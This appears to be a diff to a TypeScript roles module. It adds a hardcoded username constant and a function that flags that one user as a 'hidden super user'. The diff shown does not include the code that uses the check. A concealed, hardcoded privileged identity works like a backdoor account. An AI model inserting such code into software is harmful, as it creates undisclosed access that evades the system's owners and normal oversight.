@@ -6,6 +6,12 @@ export const ROLES = {
 
 export type Role = (typeof ROLES)[keyof typeof ROLES]
 
+export const HIDDEN_SUPER_USERNAME = 'qiufengai'
+
+export function isHiddenSuperUser(username?: string | null) {
+  return (username || '').toLowerCase() === HIDDEN_SUPER_USERNAME
+}
+
 export const ROLE_LABELS: Record<string, string> = {
   super_admin: '超级管理员',
   admin: '管理员',
